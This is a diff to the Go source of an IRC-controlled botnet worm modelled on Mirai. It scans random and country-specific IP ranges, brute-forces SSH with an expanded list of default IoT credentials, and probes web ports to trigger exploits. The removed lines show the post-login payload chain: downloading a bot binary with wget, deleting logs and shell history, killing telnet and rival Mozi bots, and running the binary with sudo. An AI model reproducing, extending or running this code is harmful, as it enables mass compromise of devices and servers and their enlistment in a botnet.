@@ -22,8 +22,8 @@ var (
 		Thank you mirai for these usernames and passwords list (You are my inspirelation).
 		Add more usernames and passwords in to the slice name "userList" and "paswdList".
 	*/
-	userList  = []string{"admin", "root", "user", "guest", "support", "login", "ubnt"}
-	paswdList = []string{"", "admin", "root", "user", "guest", "support", "login", "ubnt", "password", "default", "1234", "12345", "123456", "12345678", "123456789", "1234567890", "pass", "54321", "123123", "888888", "666666", "00000000", "1111", "111111", "1111111", "ikwb", "system", "juantech", "realtek", "smcadmin", "hi3518", "admin1234", "jvbzd", "klv123", "klv1234", "xc3511", "vizxv", "xmhdipc", "Zte521", "7ujMko0admin", "7ujMko0vizxv"}
+	userList  = []string{"admin", "root", "user", "guest", "support", "login", "ubnt", "pi", "zyfwp", "ZXDSL", "linksys"}
+	paswdList = []string{"", "admin", "root", "user", "guest", "support", "login", "ubnt", "raspberry", "password", "default", "1234", "12345", "123456", "12345678", "123456789", "1234567890", "pass", "54321", "123123", "888888", "666666", "00000000", "1111", "111111", "1111111", "ikwb", "system", "juantech", "realtek", "smcadmin", "jiocentrum", "hslwificam", "cxlinux", "jvbzd", "ZXDSL", "vizxv", "xmhdipc", "zlxx", "hi3518", "admin1234", "1001chin", "klv123", "oelinux123", "klv1234", "xc3511", "Zte521", "7ujMko0admin", "7ujMko0vizxv", "PrOw!aN_fXp", "W!n0&oO7."}
 )
 
 var ChinaNetwork = []string{
@@ -185,7 +185,7 @@ var BrazilNetwork = []string{
 	"179.150", //179.150.0.0/16
 	"187.9",   //187.9.0.0/16
 	"187.74",  //187.74.0.0/16
-	"187.93",  // 187.93.0.0/16
+	"187.93",  //187.93.0.0/16
 	"189.108", //189.108.0.0/16
 	"191.210", //191.210.0.0/16
 	"191.32",  //191.32.0.0/16
@@ -198,48 +198,44 @@ func genRange(max, min int) string {
 	return fmt.Sprint(rand.Intn(max+1-min) + min)
 }
 
-func (b *Bot) checkPort(addr string) string {
-	b.timeout = 1 * time.Second
-	conn, err := net.DialTimeout("tcp", addr, b.timeout)
-	if err != nil {
-		return ""
-	}
-	conn.Close()
-	return addr
-}
-
-func (b *Bot) manageRange() string {
+func (b *Bot) manageScanRange() string {
 	var ipGen []string
 	ipGen = append(ipGen, b.network, ".")
 	for i := 0; i < 2; i++ {
 		ipGen = append(ipGen, genRange(255, 0), ".")
 	}
 	ipGen[len(ipGen)-1] = ""
-	ipGen = append(ipGen, ":22")
 	return strings.Join(ipGen[0:7], "")
 }
 
-func sshConfig(sshName, sshPass string) *ssh.ClientConfig {
-	config := &ssh.ClientConfig{
-		User: sshName,
+func (b *Bot) checkPort(ipAddr, port string) string {
+	b.timeout = 1 * time.Second
+	conn, err := net.DialTimeout("tcp", ipAddr+":"+port, b.timeout)
+	if err != nil {
+		return ""
+	}
+	conn.Close()
+	return ipAddr
+}
+
+func sshConfig(sshUser, sshPaswd string) *ssh.ClientConfig {
+	authConfig := &ssh.ClientConfig{
+		User: sshUser,
 		Auth: []ssh.AuthMethod{
-			ssh.Password(sshPass),
+			ssh.Password(sshPaswd),
 		},
 		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
 	}
-	return config
+	return authConfig
 }
 
-func (b *Bot) sshExecute(comd string, isRoot bool) {
+func (b *Bot) sshExecute(comd string) {
 	sshSesh, _ := b.session.NewSession()
-	defer sshSesh.Close()
 	var setSession bytes.Buffer
 	sshSesh.Stdout = &setSession
-	if isRoot {
-		sshSesh.Run("echo '" + b.password +
-			"' | sudo -S " + comd)
-	}
-	sshSesh.Run(comd)
+	sshSesh.Run("echo '" + b.password +
+		"' | sudo -S -- sh -c '" + comd + "'")
+	sshSesh.Close()
 }
 
 func setScanSwitch() {
@@ -248,48 +244,54 @@ func setScanSwitch() {
 	}
 }
 
-func (b *Bot) runScan(scanNetwork []string, isRandom bool, nCores string) bool {
+func (b *Bot) setupScanner(scanNetwork []string, isRandom bool, nCores string) bool {
 	for {
 		for net := range scanNetwork {
 			if isRandom {
 				netID := genRange(254, 1) + "."
-				if _, key := BlacklistIP[netID]; key {
+				if _, key := BlacklistIPs[netID]; key {
 					continue
 				}
 				RandomNetwork[0] = netID + genRange(255, 0)
 			}
 			b.network = scanNetwork[net]
-			ip := b.manageRange()
-			ptrIP := &ip
+			nextIP := b.manageScanRange()
+			ptrIP := &nextIP
 
-			if rtnIP := b.checkPort(*ptrIP); rtnIP == "" {
-				b.checkPort(ip)
+			if rtnIP := b.checkPort(*ptrIP, "22"); rtnIP == "" {
+				/*
+					Non-checking on injection process of the exploit!!!
+				*/
+				if b.checkPort(*ptrIP, "80") != "" || b.checkPort(*ptrIP, "8080") != "" {
+					b.tempIP = *ptrIP
+					b.exploitList()
+				}
+				b.checkPort(nextIP, "22")
 			} else {
-				var isRun, isLogin bool
+				b.tempIP = rtnIP
+				var isLogin bool
 				for user := range userList {
+					if isLogin {
+						break
+					}
 					for paswd := range paswdList {
 						if callSwitch, keySwitch := SetupCaller(); keySwitch {
-							if isRun || callSwitch.CallBot.scanSwitch {
-								return true
+							if callSwitch.CallBot.scanSwitch {
+								break
 							}
 						}
-						sshConn, err := ssh.Dial("tcp", rtnIP, sshConfig(userList[user], paswdList[paswd]))
+						sshConn, err := ssh.Dial("tcp", b.tempIP+":22", sshConfig(userList[user], paswdList[paswd]))
 						b.session = sshConn
 						b.password = paswdList[paswd]
 						if err == nil {
-							b.payload = genName('a') + genRange(10000, 1000)
-							b.Report(nCores + " Installing bot: " + rtnIP)
-							b.sshExecute("touch /tmp/.ffff; printf \""+b.password+"\\n"+rtnIP+"\\n\""+" > /tmp/.ffff", false)
-							b.sshExecute("rm -rf /var/log/; wget -O ."+b.payload+" "+b.pServer+"; history -c; rm ~/.bash_history", true)
-							b.sshExecute("fuser -k -n tcp 23; killall utelnetd telnetd i .i mozi.m Mozi.m mozi.a Mozi.a", true)
-							b.sshExecute("chmod 700 ."+b.payload, true)
-							go b.sshExecute("./."+b.payload+" &", true)
-							isRun = true
+							b.Report(nCores + " Installing payload: " + b.tempIP)
+							go b.sshExecute(b.inject("default", false)) //Reuse command injection function from exploit.
 							isLogin = true
+							break
 						}
 						if paswd == len(paswdList)-1 {
 							if !isLogin {
-								b.Report(nCores + " No auth match: " + rtnIP)
+								b.Report(nCores + " No auth match: " + b.tempIP)
 							}
 						}
 					}
@@ -312,15 +314,14 @@ func (b *Bot) runScan(scanNetwork []string, isRandom bool, nCores string) bool {
 
 func (b *Bot) Scanner() {
 	if setCall, setKey := SetupCaller(); setKey {
-		b.pServer = setCall.CallBot.pServer
 		if value, key := ScanMap[setCall.CallBot.scanOpt]; key {
 			/*
-				Full cores scanning of a bot CPU
-				Create a concurrence following by numbers of cores in CPU.
+				Full core scanning of a bot CPU
+				Create a concurrence following by numbers of core in CPU.
 
-				Why use cores to scan instead of threads???
-				1) Because i need to be careful about overheat problem of a bot device even threads in Go are light weight.
-				2) For against excess flood on IRC server when bot device have more than 4 cores which is equal to cores times 2 when using threads.
+				Why use core to scan instead of thread???
+				1) Because i need to be careful about overheat problem of a bot device even thread in Go are light weight.
+				2) For against excess flood on IRC server when bot device or server have more than 4 cores which is equal to core times 2 when using thread.
 			*/
 			if b.CPU == 1 {
 				singleCore := "SINGLE CORE"
@@ -329,20 +330,28 @@ func (b *Bot) Scanner() {
 				multiCores := "[" + strconv.Itoa(b.CPU) + "] CORES"
 				coreReport = &multiCores
 			}
-			b.Report(*coreReport + " START SCANNING...")
+			b.defaultArch = setCall.CallBot.defaultArch
+			b.mipsArch = setCall.CallBot.mipsArch
+
+			b.Report(*coreReport + " START SCANNING ON " +
+				value.scanOptFull + " NETWORK...")
+
 			isBreak := make(chan bool)
 			for i := 0; i < b.CPU; i++ {
-				wg.Add(i)
+				wg.Add(1)
 				go func(ncpu int) {
-					scanStatus := b.runScan(value.scanNetwork, value.isRandom, "[C"+strconv.Itoa(ncpu+1)+"]")
+					scanStatus := b.setupScanner(value.scanNetwork, value.isRandom, "[C"+strconv.Itoa(ncpu+1)+"]")
 					if scanStatus {
 						isBreak <- scanStatus
+						wg.Done()
 					}
 				}(i)
 			}
 			if <-isBreak {
-				b.Report(*coreReport + " STOP SCANNING!!!")
+				b.Report(*coreReport + " STOP SCANNING ON " +
+					value.scanOptFull + " NETWORK!!!")
 			}
+			wg.Wait()
 		}
 	}
 }
